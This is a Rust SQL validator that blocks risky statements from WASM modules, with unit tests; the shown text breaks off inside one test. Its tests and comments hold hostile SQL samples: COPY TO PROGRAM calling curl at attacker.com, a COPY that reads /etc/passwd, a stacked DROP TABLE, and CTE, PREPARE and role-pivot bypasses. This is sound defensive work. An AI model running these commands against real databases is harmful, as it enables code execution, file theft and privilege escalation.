//! AST-based SQL validation for WASM database access.
//!
//! Replaces the previous pattern-based approach (semicolons, comment detection,
//! first-keyword extraction) with a proper SQL parser that understands the full
//! PostgreSQL grammar. This catches evasion techniques like:
//!
//! - `WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` (CTE mutation)
//! - Obfuscated DDL via whitespace/comment tricks
//! - Multi-statement injection via parser-confusing syntax
//!
//! If parsing fails, the query is rejected (fail-closed).

use sqlparser::ast::{self, Statement};
use sqlparser::dialect::PostgreSqlDialect;
use sqlparser::parser::Parser;
use std::fmt;

/// Errors from SQL validation.
#[derive(Debug)]
pub enum SqlValidationError {
    /// The SQL could not be parsed. Fail-closed: if we can't understand it, we don't run it.
    ParseError(String),
    /// More than one statement was found (multi-statement injection).
    MultipleStatements,
    /// A DDL statement (CREATE, DROP, ALTER, TRUNCATE) was detected.
    DdlBlocked(String),
    /// The statement type is not in the allowed operations list.
    DisallowedOperation(String),
    /// A CTE body contains a mutating statement not permitted by the allowlist.
    CteMutationBlocked(String),
    /// MCP-472: A statement type was rejected by the unconditional
    /// deny-list. These statements have no legitimate use from WASM
    /// modules and carry concrete escalation risk (e.g. `COPY ... TO
    /// PROGRAM` is RCE on the DB host; `SET ROLE` is privilege
    /// escalation if the connection has that capability; `LISTEN /
    /// NOTIFY` are inter-session side channels). Blocked regardless of
    /// `allowed_operations` content.
    AlwaysBlocked(String),
    /// MCP-519: the parser produced a `Statement` variant that the
    /// validator has no explicit classification for. Fail-closed
    /// because the prior `_ => "UNKNOWN"` fall-through silently
    /// admitted Create*/Drop*/Alter* variants the parser had grown
    /// beyond the enumerated set (e.g. `CreatePolicy`,
    /// `CreateDatabase`, `DropPolicy`, `AlterPolicy`). Any unhandled
    /// statement is treated as a potential bypass — operators
    /// observing this error in production should file an issue so
    /// the variant can be classified.
    UnknownStatement,
}

impl fmt::Display for SqlValidationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ParseError(msg) => write!(f, "SQL parse error: {}", msg),
            Self::MultipleStatements => {
                write!(f, "Multiple SQL statements per query are not allowed")
            }
            Self::DdlBlocked(stmt) => {
                write!(f, "{} statements are blocked by security policy", stmt)
            }
            Self::DisallowedOperation(stmt) => {
                write!(f, "{} is not in the allowed SQL operations list", stmt)
            }
            Self::CteMutationBlocked(stmt) => write!(
                f,
                "CTE contains a {} operation not permitted by the allowlist",
                stmt
            ),
            Self::AlwaysBlocked(stmt) => write!(
                f,
                "{} statements are unconditionally blocked from WASM modules \
                 (no allowlist override) — see security policy",
                stmt
            ),
            Self::UnknownStatement => write!(
                f,
                "SQL statement type is not classified by the worker validator \
                 — rejected fail-closed. If this is a legitimate operation, \
                 file an issue so the variant can be classified.",
            ),
        }
    }
}

/// Classify a parsed statement into a canonical type name (SELECT, INSERT, etc.).
///
/// MCP-519: every Create* / Drop* / Alter* variant exposed by
/// sqlparser must classify as DDL — pre-fix several PostgreSQL DDL
/// variants (`CreatePolicy`, `CreateDatabase`, `DropPolicy`,
/// `DropFunction`, `DropProcedure`, `DropTrigger`, `AlterPolicy`, …)
/// fell to the `_ => "UNKNOWN"` arm. Combined with the documented
/// "empty allowlist = no restriction beyond DDL" contract this meant
/// a WASM module with empty `allowed_sql_operations` AND the
/// database world could submit `CREATE POLICY ... USING (true)` to
/// grant cross-row visibility on RLS tables, or `DROP POLICY` to
/// strip an existing RLS row-filter — neither of which appeared as
/// DDL to `is_ddl()`. The `_ => UNKNOWN` arm in
/// `always_blocked_label` then also let DuckDB / Hive / Snowflake
/// dialects' `LOAD extension`, `INSTALL`, `LockTables`, `Use`,
/// `Pragma`, `AttachDatabase`, and `Kill` slip past unconditionally
/// (they parse with PostgreSqlDialect because sqlparser shares the
/// parser layer across dialects).
///
/// Two-layer defense: each new variant is enumerated below AND the
/// catch-all `_` is removed by replacing it with an explicit
/// `"UNKNOWN"` arm that the validator's caller now treats as a
/// fail-closed signal (`UnknownStatement` error variant).
fn statement_type(stmt: &Statement) -> &'static str {
    match stmt {
        Statement::Query(_) => "SELECT",
        Statement::Insert(_) => "INSERT",
        Statement::Update { .. } => "UPDATE",
        Statement::Delete(_) => "DELETE",
        Statement::Copy { .. } => "COPY",
        Statement::CopyIntoSnowflake { .. } => "COPY",
        Statement::Merge { .. } => "MERGE",
        Statement::Call(_) => "CALL",
        Statement::Explain { .. } | Statement::ExplainTable { .. } => "EXPLAIN",
        // CREATE — every Create* variant the parser exposes. New
        // variants in a future sqlparser bump are caught by the
        // `Unknown` fail-closed default below.
        Statement::CreateTable { .. }
        | Statement::CreateView { .. }
        | Statement::CreateVirtualTable { .. }
        | Statement::CreateIndex(_)
        | Statement::CreateSchema { .. }
        | Statement::CreateDatabase { .. }
        | Statement::CreateSequence { .. }
        | Statement::CreateType { .. }
        | Statement::CreateRole { .. }
        | Statement::CreateExtension { .. }
        | Statement::CreateFunction { .. }
        | Statement::CreateProcedure { .. }
        | Statement::CreateTrigger { .. }
        | Statement::CreatePolicy { .. }
        | Statement::CreateSecret { .. }
        | Statement::CreateMacro { .. }
        | Statement::CreateStage { .. } => "CREATE",
        // DROP — `Statement::Drop` is the generic form (DROP TABLE /
        // VIEW / etc.); each specialised Drop* variant maps here too
        // so the DDL gate fires.
        Statement::Drop { .. }
        | Statement::DropFunction { .. }
        | Statement::DropProcedure { .. }
        | Statement::DropSecret { .. }
        | Statement::DropPolicy { .. }
        | Statement::DropTrigger { .. } => "DROP",
        // ALTER — every Alter* the parser knows about.
        Statement::AlterTable { .. }
        | Statement::AlterIndex { .. }
        | Statement::AlterView { .. }
        | Statement::AlterRole { .. }
        | Statement::AlterPolicy { .. } => "ALTER",
        Statement::Truncate { .. } => "TRUNCATE",
        // Grant/Revoke
        Statement::Grant { .. } => "GRANT",
        Statement::Revoke { .. } => "REVOKE",
        // ATTACH / DETACH — modify which databases are accessible
        // for the rest of the session. Classed as DDL so the DDL
        // gate fires unconditionally.
        Statement::AttachDatabase { .. }
        | Statement::AttachDuckDBDatabase { .. }
        | Statement::DetachDuckDBDatabase { .. } => "ATTACH",
        // Fail-closed default. Any new sqlparser Statement variant
        // not enumerated above lands here. The caller maps this to
        // `SqlValidationError::UnknownStatement` and rejects the
        // query — restoring the AST-validator's fail-closed contract
        // that pre-MCP-519 was silently broken for every Create* /
        // Drop* / Alter* / extension-load class the parser had grown.
        _ => "UNKNOWN",
    }
}

/// Check whether a statement is DDL (schema-modifying).
fn is_ddl(stmt: &Statement) -> bool {
    matches!(
        statement_type(stmt),
        "CREATE" | "DROP" | "ALTER" | "TRUNCATE" | "GRANT" | "REVOKE"
    )
}

/// Check whether a statement is a mutation (INSERT/UPDATE/DELETE).
fn is_mutation(stmt: &Statement) -> bool {
    matches!(statement_type(stmt), "INSERT" | "UPDATE" | "DELETE")
}

/// MCP-472: classify a parsed statement as unconditionally blocked,
/// returning the canonical label for the error message. None means the
/// statement is not on the deny-list (the regular DDL / allowlist
/// checks still apply downstream).
///
/// These statement types have NO legitimate use from a WASM module
/// and each carries concrete escalation risk that the existing DDL +
/// allowlist gates miss:
///
/// * `COPY` — `COPY ... TO PROGRAM 'cmd'` is RCE on the DB host;
///   `COPY ... FROM '/etc/passwd'` is a local file read on the DB host.
///   Both parse successfully and currently fall to "UNKNOWN" →
///   pass-through when `allowed_operations` is empty.
/// * `SET ROLE` / `SET search_path` / generic `SET` / `RESET` /
///   `SHOW` — session-level state mutation that can pivot privileges
///   or change query semantics for the rest of the connection.
/// * `LISTEN` / `NOTIFY` / `UNLISTEN` — Postgres inter-session
///   pub/sub. Modules have no business signalling other sessions.
/// * `PREPARE` / `EXECUTE` / `DEALLOCATE` — `PREPARE foo AS DELETE
///   FROM secrets; EXECUTE foo` smuggles a mutation past the
///   allowlist (the prepared statement body isn't introspected by
///   `validate_sql` when only the EXECUTE is later sent).
/// * Transaction control (`START TRANSACTION` / `COMMIT` /
///   `ROLLBACK` / `SAVEPOINT` / `RELEASE SAVEPOINT`) — the worker
///   owns transaction boundaries; guest code must not open or close
///   one.
/// * `DISCARD` — clears cached plans / session state including
///   prepared statements the platform may depend on.
/// * `Use` — DB switch (not PostgreSQL but parsable; defensive).
///
/// Empty allowlist callers were previously allowed every non-DDL
/// statement type by design ("no allowlist = no restriction beyond
/// DDL"); this deny-list keeps that lenient default intact for
/// INSERT / UPDATE / DELETE / SELECT while closing the high-risk
/// statement types regardless of allowlist content.
fn always_blocked_label(stmt: &Statement) -> Option<&'static str> {
    match stmt {
        Statement::Copy { .. } | Statement::CopyIntoSnowflake { .. } => Some("COPY"),
        Statement::SetRole { .. } => Some("SET ROLE"),
        Statement::SetVariable { .. } => Some("SET"),
        Statement::SetTimeZone { .. } => Some("SET TIME ZONE"),
        Statement::SetNamesDefault { .. } | Statement::SetNames { .. } => Some("SET NAMES"),
        Statement::SetTransaction { .. } => Some("SET TRANSACTION"),
        Statement::ShowVariable { .. }
        | Statement::ShowStatus { .. }
        | Statement::ShowVariables { .. }
        | Statement::ShowCreate { .. }
        | Statement::ShowColumns { .. }
        | Statement::ShowTables { .. }
        | Statement::ShowDatabases { .. }
        | Statement::ShowSchemas { .. }
        | Statement::ShowViews { .. }
        | Statement::ShowCollation { .. }
        | Statement::ShowFunctions { .. } => Some("SHOW"),
        Statement::LISTEN { .. } => Some("LISTEN"),
        Statement::NOTIFY { .. } => Some("NOTIFY"),
        Statement::UNLISTEN { .. } => Some("UNLISTEN"),
        Statement::Prepare { .. } => Some("PREPARE"),
        Statement::Execute { .. } => Some("EXECUTE"),
        Statement::Deallocate { .. } => Some("DEALLOCATE"),
        Statement::StartTransaction { .. } => Some("START TRANSACTION"),
        Statement::Commit { .. } => Some("COMMIT"),
        Statement::Rollback { .. } => Some("ROLLBACK"),
        Statement::Savepoint { .. } => Some("SAVEPOINT"),
        Statement::ReleaseSavepoint { .. } => Some("RELEASE SAVEPOINT"),
        Statement::Discard { .. } => Some("DISCARD"),
        Statement::Use(_) => Some("USE"),
        // MCP-519: the following statement types parse with
        // PostgreSqlDialect (sqlparser shares the parser layer
        // across dialects) and previously fell to the
        // statement_type "UNKNOWN" bucket — bypassing both is_ddl
        // and the deny-list, then passing under empty
        // `allowed_operations`. Each one carries concrete
        // escalation / sandbox-escape risk from a WASM module:
        //
        // * `LOAD 'libfoo.so'` (Postgres) / `LOAD extension` (DuckDB)
        //   — loads a shared library / extension at runtime, RCE on
        //   the database host.
        // * `INSTALL extension` (DuckDB) — downloads + installs an
        //   extension; same RCE class.
        // * `Pragma` — SQLite-flavored session/database knobs;
        //   parses but is meaningless under PG. Deny so a future
        //   dialect-mix doesn't silently honor it.
        // * `LockTables` / `UnlockTables` — session-wide table
        //   locks; module has no business holding them.
        // * `Kill` — terminates other Postgres backends.
        // * `Comment` — PostgreSQL `COMMENT ON ...` is DDL-adjacent
        //   (metadata mutation); not on `is_ddl` but harmful
        //   enough to deny.
        // * `Declare` / `Fetch` / `Close` — server-side cursors;
        //   module's connection is short-lived so these are dead
        //   weight at best, hold-locks-open footgun at worst.
        // * `Flush` / `OptimizeTable` / `Msck` / `Cache` / `UNCache`
        //   — dialect-specific maintenance ops with no legitimate
        //   guest use.
        // * `Directory` (Hive), `Unload` / `LoadData` (warehouse
        //   data movement), `Assert` (SQL assertions) — same.
        Statement::Load { .. } => Some("LOAD"),
        Statement::Install { .. } => Some("INSTALL"),
        Statement::Pragma { .. } => Some("PRAGMA"),
        Statement::LockTables { .. } => Some("LOCK TABLES"),
        Statement::UnlockTables => Some("UNLOCK TABLES"),
        Statement::Kill { .. } => Some("KILL"),
        Statement::Comment { .. } => Some("COMMENT"),
        Statement::Declare { .. } => Some("DECLARE"),
        Statement::Fetch { .. } => Some("FETCH"),
        Statement::Close { .. } => Some("CLOSE"),
        Statement::Flush { .. } => Some("FLUSH"),
        Statement::OptimizeTable { .. } => Some("OPTIMIZE TABLE"),
        Statement::Msck { .. } => Some("MSCK"),
        Statement::Cache { .. } => Some("CACHE"),
        Statement::UNCache { .. } => Some("UNCACHE"),
        Statement::Directory { .. } => Some("DIRECTORY"),
        Statement::Unload { .. } => Some("UNLOAD"),
        Statement::LoadData { .. } => Some("LOAD DATA"),
        Statement::Assert { .. } => Some("ASSERT"),
        _ => None,
    }
}

/// Inspect CTEs within a SELECT query for hidden mutations.
///
/// PostgreSQL allows writable CTEs like:
/// ```sql
/// WITH deleted AS (DELETE FROM t RETURNING *) SELECT * FROM deleted
/// ```
/// The top-level statement parses as `Query` (SELECT) but the CTE body is a DELETE.
fn check_cte_mutations(
    query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    check_query_for_mutations(query, allowed_operations)
}

/// MCP-554: recursively walk a `Query` AST looking for mutation CTEs.
/// Pre-fix `check_cte_mutations` only inspected the top-level
/// `query.with.cte_tables` and matched only `SetExpr::Insert` /
/// `SetExpr::Update` at the CTE body level. Two bypass classes:
///
///   1. **Nested CTE inside a CTE body** — when a CTE body is itself
///      a Query (`SetExpr::Query`) carrying its own `with` clause, the
///      inner WITH was never visited:
///        `WITH outer AS (WITH inner AS (INSERT ...) SELECT ...) ...`
///
///   2. **CTE inside a FROM subquery** — when a `SELECT`'s FROM
///      contained a parenthesized `(WITH x AS (INSERT...) SELECT ...)`,
///      the subquery's `with` was never visited:
///        `SELECT * FROM (WITH b AS (INSERT ...) SELECT ...) sub`
///
/// Fix: walk every nested `Query` reachable from this one and apply
/// the same per-CTE-body mutation check. `SetExpr` doesn't expose
/// every interior `Query` directly, so we walk SELECT FROM clauses
/// and JOIN relations as well.
fn check_query_for_mutations(
    query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    // 1. Inspect this query's CTE chain.
    if let Some(ref with) = query.with {
        for cte in &with.cte_tables {
            // Check this CTE body for a direct mutation first.
            check_cte_body(&cte.query, allowed_operations)?;
            // Then recurse into nested structure (the body may
            // itself carry a `with` or contain subqueries).
            check_query_for_mutations(&cte.query, allowed_operations)?;
        }
    }
    // 2. Recurse into this query's body.
    check_set_expr_for_mutations(&query.body, allowed_operations)
}

/// Classify a CTE's direct body. Returns Ok when the body is not a
/// direct mutation; the caller must STILL recurse into the body's
/// nested structure for nested-CTE detection.
fn check_cte_body(
    cte_query: &ast::Query,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    let cte_stmt_type = match cte_query.body.as_ref() {
        ast::SetExpr::Insert(_) => "INSERT",
        ast::SetExpr::Update(_) => "UPDATE",
        _ => return Ok(()),
    };
    enforce_cte_mutation_policy(cte_stmt_type, allowed_operations)
}

fn enforce_cte_mutation_policy(
    cte_stmt_type: &str,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    // DDL inside CTEs is not valid PostgreSQL, but block it defensively.
    if cte_stmt_type == "CREATE"
        || cte_stmt_type == "DROP"
        || cte_stmt_type == "ALTER"
        || cte_stmt_type == "TRUNCATE"
    {
        return Err(SqlValidationError::DdlBlocked(cte_stmt_type.to_string()));
    }
    // Check against the allowlist.
    if !allowed_operations.is_empty() {
        let permitted = allowed_operations
            .iter()
            .any(|op| op.eq_ignore_ascii_case(cte_stmt_type));
        if !permitted {
            return Err(SqlValidationError::CteMutationBlocked(
                cte_stmt_type.to_string(),
            ));
        }
    }
    Ok(())
}

fn check_set_expr_for_mutations(
    body: &ast::SetExpr,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    match body {
        ast::SetExpr::Select(select) => {
            // FROM clauses can be table factors that are themselves
            // subqueries with their own WITH.
            for tbl in &select.from {
                check_table_with_joins(tbl, allowed_operations)?;
            }
        }
        ast::SetExpr::Query(inner) => {
            check_query_for_mutations(inner, allowed_operations)?;
        }
        ast::SetExpr::SetOperation { left, right, .. } => {
            check_set_expr_for_mutations(left, allowed_operations)?;
            check_set_expr_for_mutations(right, allowed_operations)?;
        }
        // Direct CTE-body INSERT / UPDATE handled by check_cte_body.
        // Values / Table / Insert / Update don't carry interior Queries
        // reachable in any subquery surface that would mask a CTE.
        _ => {}
    }
    Ok(())
}

fn check_table_with_joins(
    tbl: &ast::TableWithJoins,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    check_table_factor(&tbl.relation, allowed_operations)?;
    for join in &tbl.joins {
        check_table_factor(&join.relation, allowed_operations)?;
    }
    Ok(())
}

fn check_table_factor(
    relation: &ast::TableFactor,
    allowed_operations: &[String],
) -> Result<(), SqlValidationError> {
    match relation {
        ast::TableFactor::Derived { subquery, .. } => {
            check_query_for_mutations(subquery, allowed_operations)?;
        }
        ast::TableFactor::NestedJoin {
            table_with_joins, ..
        } => {
            check_table_with_joins(table_with_joins, allowed_operations)?;
        }
        // Table / TableFunction / UNNEST etc. don't carry an interior
        // Query that could hide a CTE mutation.
        _ => {}
    }
    Ok(())
}

/// Validate a SQL statement against the security policy.
///
/// Outcome of a successful [`validate_sql`] call.
///
/// `stmt_type` is the canonical statement-type name (`"SELECT"`,
/// `"INSERT"`, `"UPDATE"`, etc.) matching the legacy String return.
///
/// `returns_rows` (MCP-578) is true iff the statement actually emits
/// rows the worker should consume via `fetch_all`-shape: SELECT,
/// or a DML statement with a real `RETURNING` clause as detected
/// from the AST. Pre-existing `is_fetch` detection in
/// `host_impl::execute_query` used a substring `.contains("RETURNING")`
/// check that produced false-positives on string literals
/// (`INSERT INTO logs (msg) VALUES ('user returning home')`) and
/// identifier substrings (`UPDATE u SET returning_user = 1`). A
/// false-positive caused the controller to wrap the DML in a CTE
/// `WITH x AS (...) SELECT FROM x` which Postgres rejects with
/// "WITH query has no RETURNING clause" — the DML never runs and
/// the operator sees an opaque error instead of their INSERT
/// completing. AST-based detection eliminates the false-positive
/// without affecting the false-negative case (no impact: real
/// `RETURNING` queries continue to fetch).
#[derive(Debug, Clone)]
pub struct ValidatedStmt {
    pub stmt_type: String,
    pub returns_rows: bool,
}

/// AST-based check for whether a statement actually emits rows.
/// SELECT does. INSERT/UPDATE/DELETE only do if they carry a real
/// `RETURNING` clause. MERGE does not (no RETURNING support in PG).
/// Everything else (EXPLAIN, CALL, etc.) is treated as non-row-emitting
/// for routing purposes — the AST gate above already rejected DDL
/// and the deny-list catches the dangerous ones.
fn statement_returns_rows(stmt: &Statement) -> bool {
    use sqlparser::ast::Statement as S;
    match stmt {
        S::Query(_) => true,
        S::Insert(ins) => !ins.returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Update { returning, .. } => !returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Delete(del) => !del.returning.as_deref().unwrap_or(&[]).is_empty(),
        // EXPLAIN returns analysis rows; route as fetch so the worker
        // gets the result text.
        S::Explain { .. } | S::ExplainTable { .. } => true,
        _ => false,
    }
}

/// Returns `Ok(ValidatedStmt)` describing the statement on success,
/// or `Err(SqlValidationError)` if the query violates the policy.
///
/// Security properties:
/// - **Fail-closed**: If the SQL cannot be parsed, it is rejected.
/// - **Single-statement**: Only one statement per query is allowed.
/// - **DDL blocked**: CREATE, DROP, ALTER, TRUNCATE, GRANT, REVOKE are always rejected.
/// - **Allowlist enforcement**: If `allowed_operations` is non-empty, only listed types
///   (plus SELECT which is always allowed) are permitted.
/// - **CTE mutation detection**: Writable CTEs are checked against the allowlist.
pub fn validate_sql(
    sql: &str,
    allowed_operations: &[String],
) -> Result<ValidatedStmt, SqlValidationError> {
    let dialect = PostgreSqlDialect {};

    let statements = Parser::parse_sql(&dialect, sql).map_err(|e| {
        SqlValidationError::ParseError(format!(
            "Failed to parse SQL (query rejected for safety): {}",
            e
        ))
    })?;

    // Reject multi-statement batches
    if statements.len() != 1 {
        if statements.is_empty() {
            return Err(SqlValidationError::ParseError(
                "Empty SQL statement".to_string(),
            ));
        }
        return Err(SqlValidationError::MultipleStatements);
    }

    let stmt = &statements[0];
    let stmt_type = statement_type(stmt);

    // Always block DDL — WASM modules must never modify schema
    if is_ddl(stmt) {
        return Err(SqlValidationError::DdlBlocked(stmt_type.to_string()));
    }

    // MCP-472: deny-list of high-risk statement types that have no
    // legitimate use from a WASM module. Runs BEFORE the allowlist
    // branch so empty-allowlist callers (the documented "no
    // restriction beyond DDL" mode) still get protected. See
    // `always_blocked_label` for the per-statement-type rationale.
    if let Some(label) = always_blocked_label(stmt) {
        return Err(SqlValidationError::AlwaysBlocked(label.to_string()));
    }

    // MCP-519: fail closed on any statement type the validator
    // hasn't been taught to classify. Runs AFTER is_ddl /
    // always_blocked_label so canonical (DML / SELECT / EXPLAIN /
    // …) paths still report their specific error type — only
    // genuinely-novel variants surface this. The documented
    // "empty allowlist = no restriction beyond DDL" mode is now
    // additionally bounded by "and the statement type is one the
    // validator recognizes", which closes the silent-bypass class
    // that grew as sqlparser added new Statement variants.
    if stmt_type == "UNKNOWN" {
        return Err(SqlValidationError::UnknownStatement);
    }

    // Check for CTE mutations hidden inside SELECT queries
    if let Statement::Query(query) = stmt {
        check_cte_mutations(query, allowed_operations)?;
    }

    // Enforce allowlist (SELECT is always permitted)
    if !allowed_operations.is_empty() && stmt_type != "SELECT" {
        let permitted = allowed_operations
            .iter()
            .any(|op| op.eq_ignore_ascii_case(stmt_type));
        if !permitted {
            return Err(SqlValidationError::DisallowedOperation(
                stmt_type.to_string(),
            ));
        }
    }

    Ok(ValidatedStmt {
        stmt_type: stmt_type.to_string(),
        returns_rows: statement_returns_rows(stmt),
    })
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn select_always_allowed() {
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).is_ok());
    }

    #[test]
    fn insert_allowed_when_in_allowlist() {
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).is_ok());
    }

    #[test]
    fn insert_blocked_when_not_in_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let err = validate_sql("INSERT INTO t (a) VALUES ($1)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedOperation(_)));
    }

    #[test]
    fn ddl_always_blocked() {
        assert!(matches!(
            validate_sql("CREATE TABLE t (id INT)", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("ALTER TABLE users ADD COLUMN x TEXT", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
        assert!(matches!(
            validate_sql("TRUNCATE users", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn multi_statement_blocked() {
        assert!(matches!(
            validate_sql("SELECT 1; DROP TABLE users", &[]).unwrap_err(),
            SqlValidationError::MultipleStatements
        ));
    }

    #[test]
    fn invalid_sql_rejected() {
        assert!(matches!(
            validate_sql("NOT VALID SQL AT ALL ???", &[]).unwrap_err(),
            SqlValidationError::ParseError(_)
        ));
    }

    #[test]
    fn comments_in_valid_sql_are_fine() {
        // The AST parser handles comments correctly — they don't affect security
        assert!(validate_sql("SELECT /* comment */ 1", &[]).is_ok());
        assert!(validate_sql("SELECT 1 -- inline comment", &[]).is_ok());
    }

    #[test]
    fn update_and_delete_with_allowlist() {
        let ops = vec!["UPDATE".to_string(), "DELETE".to_string()];
        assert!(validate_sql("UPDATE t SET x = $1 WHERE id = $2", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = $1", &ops).is_ok());
    }

    #[test]
    fn empty_allowlist_allows_all_non_ddl() {
        // Empty allowlist = no restriction beyond DDL blocking
        assert!(validate_sql("INSERT INTO t (a) VALUES ($1)", &[]).is_ok());
        assert!(validate_sql("UPDATE t SET x = $1", &[]).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = $1", &[]).is_ok());
    }

    #[test]
    fn complex_select_with_subquery() {
        assert!(validate_sql(
            "SELECT * FROM (SELECT id, name FROM users WHERE active = true) t WHERE t.id > $1",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn select_with_union() {
        assert!(validate_sql("SELECT id FROM users UNION ALL SELECT id FROM admins", &[]).is_ok());
    }

    #[test]
    fn cte_select_allowed() {
        assert!(validate_sql(
            "WITH active AS (SELECT * FROM users WHERE active = true) SELECT * FROM active",
            &[]
        )
        .is_ok());
    }

    #[test]
    fn grant_blocked() {
        assert!(matches!(
            validate_sql("GRANT ALL ON users TO public", &[]).unwrap_err(),
            SqlValidationError::DdlBlocked(_)
        ));
    }

    #[test]
    fn explain_allowed_by_default() {
        // EXPLAIN is read-only — useful for query optimization
        assert!(validate_sql("EXPLAIN SELECT 1", &[]).is_ok());
    }

    #[test]
    fn returns_correct_statement_type() {
        assert_eq!(validate_sql("SELECT 1", &[]).unwrap().stmt_type, "SELECT");
        assert_eq!(
            validate_sql("INSERT INTO t (a) VALUES (1)", &[]).unwrap().stmt_type,
            "INSERT"
        );
        assert_eq!(validate_sql("UPDATE t SET a = 1", &[]).unwrap().stmt_type, "UPDATE");
        assert_eq!(
            validate_sql("DELETE FROM t WHERE id = 1", &[]).unwrap().stmt_type,
            "DELETE"
        );
    }

    // MCP-578: AST-based `returns_rows` detection. Pre-fix the worker
    // used a substring `.contains("RETURNING")` check on the raw SQL,
    // which false-positived on string literals and identifier
    // substrings. The false-positive caused the controller to wrap
    // the DML in a CTE that Postgres rejected with "WITH query has
    // no RETURNING clause" — the operator's INSERT never ran.
    #[test]
    fn returns_rows_select() {
        assert!(validate_sql("SELECT 1", &[]).unwrap().returns_rows);
        assert!(validate_sql("SELECT * FROM users WHERE id = $1", &[]).unwrap().returns_rows);
    }

    #[test]
    fn returns_rows_insert_with_returning() {
        let ops = vec!["INSERT".to_string()];
        let v = validate_sql("INSERT INTO t (a) VALUES ($1) RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_insert_without_returning_is_false() {
        let v = validate_sql("INSERT INTO t (a) VALUES ($1)", &[]).unwrap();
        assert!(!v.returns_rows, "INSERT without RETURNING should not return rows");
    }

    #[test]
    fn returns_rows_insert_with_returning_substring_in_string_literal_is_false() {
        // The historical false-positive: substring "RETURNING" appears
        // inside a string literal but the actual statement has NO
        // RETURNING clause. Pre-fix the worker's
        // `sql.to_uppercase().contains("RETURNING")` returned true →
        // controller CTE-wrapped → PG rejected → INSERT never ran.
        // AST-based detection sees no Returning node in the Insert
        // AST and correctly returns false.
        let v = validate_sql("INSERT INTO logs (msg) VALUES ('user returning home')", &[])
            .unwrap();
        assert!(
            !v.returns_rows,
            "string-literal 'returning' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_returning_substring_in_identifier_is_false() {
        // Identifier-substring false positive: column name happens to
        // contain "RETURNING" but no actual RETURNING clause.
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql(
            "UPDATE users SET returning_user_count = 1 WHERE id = $1",
            &ops,
        )
        .unwrap();
        assert!(
            !v.returns_rows,
            "identifier substring 'returning_user_count' must not flip returns_rows"
        );
    }

    #[test]
    fn returns_rows_update_with_real_returning() {
        let ops = vec!["UPDATE".to_string()];
        let v = validate_sql("UPDATE t SET a = $1 WHERE id = $2 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_with_real_returning() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1 RETURNING id", &ops).unwrap();
        assert!(v.returns_rows);
    }

    #[test]
    fn returns_rows_delete_without_returning_is_false() {
        let ops = vec!["DELETE".to_string()];
        let v = validate_sql("DELETE FROM t WHERE id = $1", &ops).unwrap();
        assert!(!v.returns_rows);
    }

    #[test]
    fn returns_rows_explain_is_true() {
        // EXPLAIN returns analysis output rows; should route as fetch.
        let v = validate_sql("EXPLAIN SELECT 1", &[]).unwrap();
        assert!(v.returns_rows);
    }

    // MCP-472: unconditional deny-list. Each statement type below
    // parses successfully through sqlparser-rs 0.53 but had no entry
    // in `statement_type()` and therefore fell to "UNKNOWN" — which
    // (a) is NOT in `is_ddl`, (b) is NOT "SELECT", so under the
    // documented "empty allowlist = no restriction beyond DDL"
    // contract it passed through the validator and reached the
    // database. Each example below is reachable from a WASM module
    // with Database capability + empty `allowed_sql_operations`.

    #[test]
    fn copy_to_program_is_unconditionally_blocked() {
        // PostgreSQL `COPY ... TO PROGRAM 'cmd'` = arbitrary shell
        // command on the database host (well-known RCE vector). Must
        // be rejected regardless of allowlist content.
        for ops in [vec![], vec!["SELECT".to_string(), "INSERT".to_string()]] {
            let err =
                validate_sql("COPY secrets TO PROGRAM 'curl https://attacker.com/'", &ops)
                    .unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "COPY"),
                other => panic!("expected AlwaysBlocked(COPY), got {:?}", other),
            }
        }
    }

    #[test]
    fn copy_from_file_is_unconditionally_blocked() {
        // `COPY ... FROM '/etc/passwd'` = arbitrary file read on the
        // database host. Same blanket block.
        let err =
            validate_sql("COPY secrets FROM '/etc/passwd'", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn set_role_is_unconditionally_blocked() {
        // `SET ROLE` can pivot to a higher-privilege Postgres role
        // if the connection has that capability. Block unconditionally.
        for ops in [vec![], vec!["SELECT".to_string()]] {
            let err = validate_sql("SET ROLE postgres", &ops).unwrap_err();
            match err {
                SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET ROLE"),
                other => panic!("expected AlwaysBlocked(SET ROLE), got {:?}", other),
            }
        }
    }

    #[test]
    fn set_search_path_is_unconditionally_blocked() {
        // search_path manipulation can redirect unqualified table
        // references to attacker-controlled schemas — Postgres
        // privilege-escalation classic.
